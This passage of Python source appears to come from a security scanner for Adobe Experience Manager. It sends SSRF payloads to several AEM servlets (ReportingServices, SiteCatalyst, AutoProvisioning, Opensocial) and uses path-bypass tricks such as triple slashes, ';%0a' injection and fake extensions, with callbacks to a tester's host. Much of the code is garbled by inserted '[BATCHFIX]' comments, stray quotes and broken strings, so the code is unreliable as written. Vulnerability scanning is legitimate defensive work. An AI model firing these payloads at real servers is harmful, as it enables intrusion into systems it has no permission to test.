        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.css?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.js?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.ico?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.png?url={{0}}%23/api1.omniture.com/a&q=a","        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.{0}.bmp?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.css"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.html"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.ico"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.png"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.bmp"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet.{0}.js"  # [BATCHFIX] closed string"        "?url={{0}}%23/api1.omniture.com/a&q=a","    )
    cache_buster = randint(0, 2**12)
    REPOSTINGSERVICESSERVLET3 = (path.format(cache_buster) for path in REPOSTINGSERVICESSERVLET3)

    for path in itertools.chain(REPOSTINGSERVICESSERVLET1, REPOSTINGSERVICESSERVLET2, REPOSTINGSERVICESSERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/reportingservices/{2}/".format(my_host, token, encoded_orig_url)"        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy, debug=debug)
        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_reportingservices_servlet", url=url)"
    time.sleep(10)

    if "reportingservices" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("reportingservices")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "ReportingServicesServlet","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via ReportingServicesServlet (CVE-2018-12809) was detected."  # [BATCHFIX] closed string"            "See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html","        )

        results.append(f)

    return results


@register("sitecatalyst_servlet")"def ssrf_sitecatalyst_servlet(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SITECATALYST1 = (
# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.html?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.4.2.1...json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.1.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/a.1.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/a.4.2.1...json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.html?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.1.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.4.2.1...json"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.html?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.1.json?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.4.2.1...json"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""         "?datacenter={0}%23"  # [BATCHFIX] closed string"        "&company=xxx&username=zzz&secret=yyyy","    )

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SITECATALYST2 = (
# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet/{0}.bmp?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet;%0a{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json/{0}.ico?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/templates/sitecatalyst/jcr:content.segments.json;%0a{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet///{0}.bmp?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet;%0a{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json///{0}.ico?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json;%0a{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","    )
    cache_buster = random_string()
    SITECATALYST2 = (path.format(cache_buster) for path in SITECATALYST2)

# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     SITECATALYST3 = (
# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet.{0}.gif?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.css?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.js?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.html?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.png?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","# [BATCHFIX] Commented metadata/non-Python
"""         "///libs///cq///analytics///components///sitecatalystpage///segments.json.servlet.{0}.gif?"  # [BATCHFIX] closed string"        "datacenter={{0}}%23&company=xxx&username=zzz&secret=yyyy","    )
    cache_buster = randint(1, 2**12)
    SITECATALYST3 = (path.format(cache_buster) for path in SITECATALYST3)

    for path in itertools.chain(SITECATALYST1, SITECATALYST2, SITECATALYST3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/sitecatalyst/{2}/".format(my_host, token, encoded_orig_url)"        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy, debug=debug)
        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_sitecatalyst_servlet", url=url)"
    time.sleep(10)

    if "sitecatalyst" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("sitecatalyst")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "SiteCatalystServlet","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via SiteCatalystServlet was detected. It might result in RCE -"  # [BATCHFIX] closed string"            "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87","        )

        results.append(f)

    return results


@register("autoprovisioning_servlet")"def ssrf_autoprovisioning_servlet(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     AUTOPROVISIONING1 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/cq/cloudservicesprovisioning/content/autoprovisioning","            "///libs///cq///cloudservicesprovisioning///content///autoprovisioning","        ),
        (".json", ".4.2.1...json", ".1.json", ".html", ".html/a.1.json", ".html/a.4.2.1...json"),"    )
    AUTOPROVISIONING1 = list("{0}{1}".format(p1, p2) for p1, p2 in AUTOPROVISIONING1)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     AUTOPROVISIONING2 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/cq/cloudservicesprovisioning/content/autoprovisioning","            "///libs///cq///cloudservicesprovisioning///content///autoprovisioning","        ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            ".json;%0a{0}.css","            ".json;%0a{0}.png","            ".html;%0a{0}.css","            ".html;%0a{0}.png","            ".json/{0}.css","            ".json/{0}.js","            ".json/{0}.png","            ".json/a.gif","            ".html/{0}.css","            ".html/{0}.js","            ".html/{0}.png","            ".json/{0}.html","        ),
    )
    cache_buster = random_string()
    AUTOPROVISIONING2 = list("{0}{1}".format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING2)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     AUTOPROVISIONING3 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/cq/cloudservicesprovisioning/content/autoprovisioning","            "///libs///cq///cloudservicesprovisioning///content///autoprovisioning","        ),
        (".{0}.css", ".{0}.js", ".{0}.ico", ".{0}.png", ".{0}.jpeg", ".{0}.gif"),"    )
    cache_buster = randint(1, 2**12)
    AUTOPROVISIONING3 = list("{0}{1}".format(p1, p2.format(cache_buster)) for p1, p2 in AUTOPROVISIONING3)"
    for path in itertools.chain(AUTOPROVISIONING1, AUTOPROVISIONING2, AUTOPROVISIONING3):
        url = normalize_url(base_url, path)
        enc_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/autoprovisioning/{2}/".format(my_host, token, enc_orig_url)"
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         data = (
# [BATCHFIX] Commented metadata/non-Python
"""             "servicename=analytics&analytics.server={0}&analytics.company=1"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
"""             "&analytics.username=2&analytics.secret=3&analytics.reportsuite=4"  # [BATCHFIX] closed string"        ).format(back_url)
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": base_url}"
        try:
            http_request(url, "POST", data=data, additional_headers=headers, proxy=proxy, debug=debug)"        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_autoprovisioning_servlet", url=url)"
    time.sleep(10)

    if "autoprovisioning" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("autoprovisioning")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "AutoProvisioningServlet","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via AutoProvisioningServlet was detected. It might result in RCE -"  # [BATCHFIX] closed string"            "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87","        )

        results.append(f)

    return results


@register("opensocial_proxy")"def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     OPENSOCIAL1 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/opensocial/proxy{0}?container=default&url={{0}}","            "///libs///opensocial///proxy{0}?container=default&url={{0}}","        ),
# [BATCHFIX] Commented metadata/non-Python
#         (", ".json", ".1.json", ".4.2.1...json", ".html"),"  # [BATCHFIX] closed string"    )
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     OPENSOCIAL1 = list(pair[0].format(pair[1]) for pair in OPENSOCIAL1)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     OPENSOCIAL2 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/opensocial/proxy{0}?container=default&url={{0}}","            "///libs///opensocial///proxy{0}?container=default&url={{0}}","        ),
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/{0}.1.json","            "/{0}.4.2.1...json","            "/{0}.css","            "/{0}.js","            "/{0}.png","            "/{0}.bmp","            ";%0a{0}.css","            ";%0a{0}.js","            ";%0a{0}.png","            ";%0a{0}.html","            ";%0a{0}.ico","            ";%0a{0}.png","            "/{0}.ico","            "./{0}.html","        ),
    )
    cache_buster = random_string()
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     OPENSOCIAL2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL2)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     OPENSOCIAL3 = itertools.product(
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/libs/opensocial/proxy{0}?container=default&url={{0}}","            "///libs///opensocial///proxy{0}?container=default&url={{0}}","        ),
        (".{0}.css", ".{0}.js", ".{0}.png", ".{0}.ico", ".{0}.bmp", ".{0}.gif", ".{0}.html"),"    )
    cache_buster = randint(1, 2**12)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     OPENSOCIAL3 = list(pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL3)""""
    for path in itertools.chain(OPENSOCIAL1, OPENSOCIAL2, OPENSOCIAL3):
        url = normalize_url(base_url, path)
        encoded_orig_url = (base64.b16encode(url.encode())).decode()
        back_url = "http://{0}/{1}/opensocial/{2}/".format(my_host, token, encoded_orig_url)"        url = url.format(back_url)

        try:
            http_request(url, proxy=proxy, debug=debug)
        except Exception:
            if debug:
                error("Exception while performing a check", check="ssrf_opensocial_proxy", url=url)"
    time.sleep(10)

    if "opensocial" in d:"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""         u = base64.b16decode(d.get("opensocial")[0]).decode()"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         f = Finding(
            "Opensocial (shindig) proxy","            u,
# [BATCHFIX] Commented metadata/non-Python
"""             "SSRF via Opensocial (shindig) proxy. See -"  # [BATCHFIX] closed string"            "https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41","        )

        results.append(f)

    return results


@register("opensocial_makeRequest")"def ssrf_opensocial_makeRequest(base_url, my_host, debug=False, proxy=None):
    pass  # [BATCHFIX] inserted for empty block
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     results = []""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     MAKEREQUEST1 = itertools.product(
        ("/libs/opensocial/makeRequest{0}?url={{0}}", "///libs///opensocial///makeRequest{0}?url={{0}}"),"# [BATCHFIX] Commented metadata/non-Python
#         (", ".json", ".1.json", ".4.2.1...json", ".html"),"  # [BATCHFIX] closed string"    )
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     MAKEREQUEST1 = list(pair[0].format(pair[1]) for pair in MAKEREQUEST1)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     MAKEREQUEST2 = itertools.product(
        ("/libs/opensocial/makeRequest{0}?url={{0}}", "///libs///opensocial///makeRequest{0}?url={{0}}"),"# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#         (
            "/{0}.1.json","            "/{0}.4.2.1...json","            "/{0}.css","            "/{0}.js","            "/{0}.png","            "/{0}.bmp","            ";%0a{0}.css","            ";%0a{0}.js","            ";%0a{0}.png","            ";%0a{0}.html","            ";%0a{0}.ico","            ";%0a{0}.png","            "/{0}.ico","            "./{0}.html","        ),
    )
    cache_buster = random_string()
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
"""     MAKEREQUEST2 = list(pair[0].format(pair[1].format(cache_buster)) for pair in MAKEREQUEST2)""""
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented unmatched parenthesis""""#     MAKEREQUEST3 = itertools.product(
        ("/libs/opensocial/makeRequest{0}?url={{0}}", "///libs///opensocial///makeRequest{0}?url={{0}}"),"        (".{0}.css", ".{0}.js", ".{0}.png", ".{0}.ico", ".{0}.bmp", ".{0}.gif", ".{0}.html"),"    )
    cache_buster = randint(1, 2**12)
# [BATCHFIX] Commented metadata/non-Python
""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
